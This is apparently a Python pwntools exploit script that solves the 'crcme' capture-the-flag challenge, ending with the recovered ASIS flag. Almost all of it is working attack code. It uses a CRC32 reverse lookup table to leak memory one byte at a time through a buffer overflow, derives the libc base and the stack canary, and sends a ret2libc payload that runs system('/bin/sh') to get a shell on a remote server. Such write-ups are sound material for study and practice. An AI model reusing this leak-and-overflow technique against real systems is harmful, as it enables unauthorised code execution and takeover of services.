#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "i386"

elf = ELF("./crcme")
libc = ELF("./libc6-i386_2.23-0ubuntu7_amd64.so")
#r = process("./crcme", env={"LD_PRELOAD": "./libc6-i386_2.23-0ubuntu7_amd64.so"})
r = remote("69.90.132.40", 4002)

#pause()
CRC = {0xd202ef8d: '\x00', 0xa505df1b: '\x01', 0x3c0c8ea1: '\x02', 0x4b0bbe37: '\x03', 0xd56f2b94: '\x04', 0xa2681b02: '\x05', 0x3b614ab8: '\x06', 0x4c667a2e: '\x07', 0xdcd967bf: '\x08', 0xabde5729: '\x09', 0x32d70693: '\x0a', 0x45d03605: '\x0b', 0xdbb4a3a6: '\x0c', 0xacb39330: '\x0d', 0x35bac28a: '\x0e', 0x42bdf21c: '\x0f', 0xcfb5ffe9: '\x10', 0xb8b2cf7f: '\x11', 0x21bb9ec5: '\x12', 0x56bcae53: '\x13', 0xc8d83bf0: '\x14', 0xbfdf0b66: '\x15', 0x26d65adc: '\x16', 0x51d16a4a: '\x17', 0xc16e77db: '\x18', 0xb669474d: '\x19', 0x2f6016f7: '\x1a', 0x58672661: '\x1b', 0xc603b3c2: '\x1c', 0xb1048354: '\x1d', 0x280dd2ee: '\x1e', 0x5f0ae278: '\x1f', 0xe96ccf45: '\x20', 0x9e6bffd3: '\x21', 0x0762ae69: '\x22', 0x70659eff: '\x23', 0xee010b5c: '\x24', 0x99063bca: '\x25', 0x000f6a70: '\x26', 0x77085ae6: '\x27', 0xe7b74777: '\x28', 0x90b077e1: '\x29', 0x09b9265b: '\x2a', 0x7ebe16cd: '\x2b', 0xe0da836e: '\x2c', 0x97ddb3f8: '\x2d', 0x0ed4e242: '\x2e', 0x79d3d2d4: '\x2f', 0xf4dbdf21: '\x30', 0x83dcefb7: '\x31', 0x1ad5be0d: '\x32', 0x6dd28e9b: '\x33', 0xf3b61b38: '\x34', 0x84b12bae: '\x35', 0x1db87a14: '\x36', 0x6abf4a82: '\x37', 0xfa005713: '\x38', 0x8d076785: '\x39', 0x140e363f: '\x3a', 0x630906a9: '\x3b', 0xfd6d930a: '\x3c', 0x8a6aa39c: '\x3d', 0x1363f226: '\x3e', 0x6464c2b0: '\x3f', 0xa4deae1d: '\x40', 0xd3d99e8b: '\x41', 0x4ad0cf31: '\x42', 0x3dd7ffa7: '\x43', 0xa3b36a04: '\x44', 0xd4b45a92: '\x45', 0x4dbd0b28: '\x46', 0x3aba3bbe: '\x47', 0xaa05262f: '\x48', 0xdd0216b9: '\x49', 0x440b4703: '\x4a', 0x330c7795: '\x4b', 0xad68e236: '\x4c', 0xda6fd2a0: '\x4d', 0x4366831a: '\x4e', 0x3461b38c: '\x4f', 0xb969be79: '\x50', 0xce6e8eef: '\x51', 0x5767df55: '\x52', 0x2060efc3: '\x53', 0xbe047a60: '\x54', 0xc9034af6: '\x55', 0x500a1b4c: '\x56', 0x270d2bda: '\x57', 0xb7b2364b: '\x58', 0xc0b506dd: '\x59', 0x59bc5767: '\x5a', 0x2ebb67f1: '\x5b', 0xb0dff252: '\x5c', 0xc7d8c2c4: '\x5d', 0x5ed1937e: '\x5e', 0x29d6a3e8: '\x5f', 0x9fb08ed5: '\x60', 0xe8b7be43: '\x61', 0x71beeff9: '\x62', 0x06b9df6f: '\x63', 0x98dd4acc: '\x64', 0xefda7a5a: '\x65', 0x76d32be0: '\x66', 0x01d41b76: '\x67', 0x916b06e7: '\x68', 0xe66c3671: '\x69', 0x7f6567cb: '\x6a', 0x0862575d: '\x6b', 0x9606c2fe: '\x6c', 0xe101f268: '\x6d', 0x7808a3d2: '\x6e', 0x0f0f9344: '\x6f', 0x82079eb1: '\x70', 0xf500ae27: '\x71', 0x6c09ff9d: '\x72', 0x1b0ecf0b: '\x73', 0x856a5aa8: '\x74', 0xf26d6a3e: '\x75', 0x6b643b84: '\x76', 0x1c630b12: '\x77', 0x8cdc1683: '\x78', 0xfbdb2615: '\x79', 0x62d277af: '\x7a', 0x15d54739: '\x7b', 0x8bb1d29a: '\x7c', 0xfcb6e20c: '\x7d', 0x65bfb3b6: '\x7e', 0x12b88320: '\x7f', 0x3fba6cad: '\x80', 0x48bd5c3b: '\x81', 0xd1b40d81: '\x82', 0xa6b33d17: '\x83', 0x38d7a8b4: '\x84', 0x4fd09822: '\x85', 0xd6d9c998: '\x86', 0xa1def90e: '\x87', 0x3161e49f: '\x88', 0x4666d409: '\x89', 0xdf6f85b3: '\x8a', 0xa868b525: '\x8b', 0x360c2086: '\x8c', 0x410b1010: '\x8d', 0xd80241aa: '\x8e', 0xaf05713c: '\x8f', 0x220d7cc9: '\x90', 0x550a4c5f: '\x91', 0xcc031de5: '\x92', 0xbb042d73: '\x93', 0x2560b8d0: '\x94', 0x52678846: '\x95', 0xcb6ed9fc: '\x96', 0xbc69e96a: '\x97', 0x2cd6f4fb: '\x98', 0x5bd1c46d: '\x99', 0xc2d895d7: '\x9a', 0xb5dfa541: '\x9b', 0x2bbb30e2: '\x9c', 0x5cbc0074: '\x9d', 0xc5b551ce: '\x9e', 0xb2b26158: '\x9f', 0x04d44c65: '\xa0', 0x73d37cf3: '\xa1', 0xeada2d49: '\xa2', 0x9ddd1ddf: '\xa3', 0x03b9887c: '\xa4', 0x74beb8ea: '\xa5', 0xedb7e950: '\xa6', 0x9ab0d9c6: '\xa7', 0x0a0fc457: '\xa8', 0x7d08f4c1: '\xa9', 0xe401a57b: '\xaa', 0x930695ed: '\xab', 0x0d62004e: '\xac', 0x7a6530d8: '\xad', 0xe36c6162: '\xae', 0x946b51f4: '\xaf', 0x19635c01: '\xb0', 0x6e646c97: '\xb1', 0xf76d3d2d: '\xb2', 0x806a0dbb: '\xb3', 0x1e0e9818: '\xb4', 0x6909a88e: '\xb5', 0xf000f934: '\xb6', 0x8707c9a2: '\xb7', 0x17b8d433: '\xb8', 0x60bfe4a5: '\xb9', 0xf9b6b51f: '\xba', 0x8eb18589: '\xbb', 0x10d5102a: '\xbc', 0x67d220bc: '\xbd', 0xfedb7106: '\xbe', 0x89dc4190: '\xbf', 0x49662d3d: '\xc0', 0x3e611dab: '\xc1', 0xa7684c11: '\xc2', 0xd06f7c87: '\xc3', 0x4e0be924: '\xc4', 0x390cd9b2: '\xc5', 0xa0058808: '\xc6', 0xd702b89e: '\xc7', 0x47bda50f: '\xc8', 0x30ba9599: '\xc9', 0xa9b3c423: '\xca', 0xdeb4f4b5: '\xcb', 0x40d06116: '\xcc', 0x37d75180: '\xcd', 0xaede003a: '\xce', 0xd9d930ac: '\xcf', 0x54d13d59: '\xd0', 0x23d60dcf: '\xd1', 0xbadf5c75: '\xd2', 0xcdd86ce3: '\xd3', 0x53bcf940: '\xd4', 0x24bbc9d6: '\xd5', 0xbdb2986c: '\xd6', 0xcab5a8fa: '\xd7', 0x5a0ab56b: '\xd8', 0x2d0d85fd: '\xd9', 0xb404d447: '\xda', 0xc303e4d1: '\xdb', 0x5d677172: '\xdc', 0x2a6041e4: '\xdd', 0xb369105e: '\xde', 0xc46e20c8: '\xdf', 0x72080df5: '\xe0', 0x050f3d63: '\xe1', 0x9c066cd9: '\xe2', 0xeb015c4f: '\xe3', 0x7565c9ec: '\xe4', 0x0262f97a: '\xe5', 0x9b6ba8c0: '\xe6', 0xec6c9856: '\xe7', 0x7cd385c7: '\xe8', 0x0bd4b551: '\xe9', 0x92dde4eb: '\xea', 0xe5dad47d: '\xeb', 0x7bbe41de: '\xec', 0x0cb97148: '\xed', 0x95b020f2: '\xee', 0xe2b71064: '\xef', 0x6fbf1d91: '\xf0', 0x18b82d07: '\xf1', 0x81b17cbd: '\xf2', 0xf6b64c2b: '\xf3', 0x68d2d988: '\xf4', 0x1fd5e91e: '\xf5', 0x86dcb8a4: '\xf6', 0xf1db8832: '\xf7', 0x616495a3: '\xf8', 0x1663a535: '\xf9', 0x8f6af48f: '\xfa', 0xf86dc419: '\xfb', 0x660951ba: '\xfc', 0x110e612c: '\xfd', 0x88073096: '\xfe', 0xff000000: '\xff'}

def leak_byte(address):
    r.recvuntil(": ")
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline("A" * 100 + p32(address))
    r.recvuntil(": ")
    crc = int(r.recvline(), 16)
    return CRC[crc]

def leak(address, len):
    return "".join(leak_byte(address+i) for i in range(len))

libc_base = u32(leak(elf.symbols["stdin"], 4)) - libc.symbols["_IO_2_1_stdin_"]
log.info("libc_base = " + hex(libc_base))

environ = u32(leak(libc_base + libc.symbols['environ'], 4))
canary = u32(leak(environ - 0xd0, 4))
log.info("canary = " + hex(canary))

r.recvuntil(": ")
r.sendline("A" * 40 + p32(canary) + "A" * 12 + flat(
    libc_base + libc.symbols["system"], 0,
    libc_base + next(libc.search("/bin/sh")),
    ))

r.interactive()

# ASIS{db17755326b5df9dab92e18e43c3ee51}
